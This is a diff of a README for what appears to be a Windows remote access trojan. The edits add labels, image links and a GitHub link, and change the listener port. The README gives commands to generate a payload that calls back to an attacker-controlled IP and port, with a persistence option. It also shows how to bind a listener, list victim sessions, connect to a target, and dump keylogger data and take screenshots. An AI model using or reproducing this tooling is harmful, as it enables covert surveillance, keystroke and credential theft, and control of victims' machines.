@@ -34,27 +34,27 @@ You can get the payload file in two ways:
     <li>Compiled File</li>
 </ul>
 
+Source file
 
 ```
 $ python3 server.py generate -a server_ip -p server_port -o "C:\Users\{...}\Downloads\{name_output}" -s -per
 $ python3 server.py generate -a 192.168.1.100 -p 9001 -o "C:\Users\1com3456\Downloads\winsrat" -s -per
 ```
-
-
+Compiled file
 
 ```
 $ python3 server.py generate -a server_ip -p server_port -o "C:\Users\{...}\Downloads\{name_output}"
 $ python3 server.py generate -a 192.168.1.100 -p 9001 -o  "C:\Users\1com3456\Downloads\winsrat"
 ```
 
-<h6 align="center"><img src=""></h6>
+<h6 align="center"><img src="/img/generate.png"></h6>
 
 Replace your IP Address and Port on above commands. 
 
 ### Running Server
 The server must be executed on Windows. You can buy a VPS or Cloud Server for connections. For the record, the server doesn't store any session from last run. So, all the progress will lost once the server application gets terminated. Running your server:
 ```
-$ python3 server.py bind -a 0.0.0.0 -p 2999
+$ python3 server.py bind -a 0.0.0.0 -p 9001
 ```
 
 ### Connections
@@ -63,7 +63,7 @@ All the connections will be listed under **sessions** command:
 $ sessions
 ```
 
-<h6 align="center"><img src=""></h6>
+<h6 align="center"><img src="/img/sessions.png"></h6>
 
 You can connect to you target session with **connect** command and launch one of available commands: 
 ```
@@ -73,7 +73,7 @@ $ keylogger dump
 $ screenshot
 ```
 
-<h6 align="center"><img src=""></h6>
+<h6 align="center"><img src="/img/kl_scr.png"></h6>
 
 ### Help
 Get a list of available commands: 
@@ -92,3 +92,4 @@ Discord: TheFlash2k#0407
 
 ### Support the improvement 
 Instagram: <a href="https://www.instagram.com/_tthemzdl5678/">_tthemzdl5678</a><br>
+Github: <a href="https://github.com/ThemeHackers/">ThemeHackers</a><br>
